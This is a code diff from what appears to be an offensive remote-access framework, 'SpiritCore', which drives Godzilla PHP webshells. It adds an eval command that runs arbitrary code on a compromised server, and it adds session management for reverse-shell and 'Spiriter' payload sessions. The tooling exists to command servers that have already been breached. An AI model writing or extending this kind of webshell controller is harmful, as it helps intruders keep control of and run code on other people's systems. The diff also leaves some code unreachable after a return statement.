@@ -1,9 +1,10 @@
+from SpiritCore.Lib.Spiriter import Spiriter
 from SpiritCore.System import *
 from SpiritCore.FCmd import *
 from SpiritCore.Lib.Godzilla.PHP import *
 import requests,re,base64,threading,time
 import os,sys,getopt
-
+import uuid
 class PhpSessionConsole(Cmd):
     Object=None
     def __init__(self):
@@ -49,6 +50,9 @@ class PhpSessionConsole(Cmd):
             print_error("Turn Failed ~_~")
     def do_shell(self,line):
         self.PHP_SHELL(line)
+    def sdo_eval(self,line):
+        Eval = line
+        self.Object.Object.EvalCode(Eval)
     def PHP_SHELL(self,line):
         print_msg("Execute Command ")
         if line=="":
@@ -95,7 +99,7 @@ class PhpSessionConsole(Cmd):
                     self.prompt = TextColor(Path, COLO_RED) + " >"
                     self.Object.Path = Path
             except Exception as error:
-                print(error)
+                write(error)
     def do_ls(self,line):
         #dirName
         #getFile
@@ -138,8 +142,9 @@ class PhpSessionConsole(Cmd):
                     if self.use_rawinput:
                         try:
                             if sys.version_info.major == 2:
+
                                 line = raw_input(self.prompt)
-                                # print(line)
+                                # write(line)
                             else:
                                 line = str(input(self.prompt))  # stdout stdin Not Support TAB Key
                                 '''sys.stdout.write(self.prompt)
@@ -152,6 +157,9 @@ class PhpSessionConsole(Cmd):
                                     '''
                         except EOFError:
                             line = 'EOF'
+                        except:
+                            print_warning("Back Console")
+                            return;
                     else:
                         self.stdout.write(self.prompt)
                         self.stdout.flush()
@@ -226,7 +234,7 @@ class SessionConsole(Cmd):
                         try:
                             if sys.version_info.major == 2:
                                 line = raw_input(self.prompt)
-                                # print(line)
+                                # write(line)
                             else:
                                 line = str(input(self.prompt))  # stdout stdin Not Support TAB Key
                                 '''sys.stdout.write(self.prompt)
@@ -275,6 +283,7 @@ class SessionConsole(Cmd):
 
 class Session(threading.Thread):
     UUID=""
+    SObject=None
     Payload=""
     TargetIp=""
     PayloadType="None"
@@ -285,6 +294,8 @@ class Session(threading.Thread):
     Object=None
     SessionSocket=None
     TargetType=00
+    SpiriterSession={}
+    ListThread=None
     Path = ""
     def __init__(self,Object):
         threading.Thread.__init__(self)
@@ -296,18 +307,40 @@ class Session(threading.Thread):
 
 
 
-    def Console(self):
+    def Console(self,UUID):
         if self.Payload=="Godzilla/PHP":
             SessionConsoleObj = PhpSessionConsole()
             SessionConsoleObj.Init(self)
-            SessionConsoleObj.prompt = "%s >"%TextColor(self.Path,COLO_RED)
+            SessionConsoleObj.prompt = "Spirit %s >"%TextColor(self.Path,COLO_RED)
             try:
                 SessionConsoleObj.cmdloop()
             except KeyboardInterrupt as Error:
                 #SessionConsoleObj.Object.Object
                 return
         elif self.PayloadType=="Shell":
+            self.Object=self.SObject.UsePayloadObject
             self.SessionSocket = self.Object.Console(self.SessionSocket)
+            self.UUID = uuid.uuid1().__str__()
+            print_success("UUID:%s   " % (self.UUID))
+            self.SObject.SessionManager.update({self.UUID: self})
+            self.SObject.UsePayloadObject.SetUUidSession(self.UUID)
+            
+        elif self.PayloadType=="Spiriter":
+            WriteLogs("Create Spiriter Session Manager")
+            self.Object=self.SObject.UsePayloadObject
+            try:
+                self.Object.SObject=self.SObject
+                self.Object.SessionObject=self
+                self.Object.Listen(self)
+            except Exception as error:
+                print_error(error.__str__())
+            if UUID!="":
+                self.Object.Console(self.SpiriterSession[UUID])
+            return
+            self.UUID = uuid.uuid1().__str__()
+            print_success("UUID:%s   " % (self.UUID))
+            self.SObject.SessionManager.update({self.UUID: self})
+            self.SObject.UsePayloadObject.SetUUidSession(self.UUID)
 
 
 
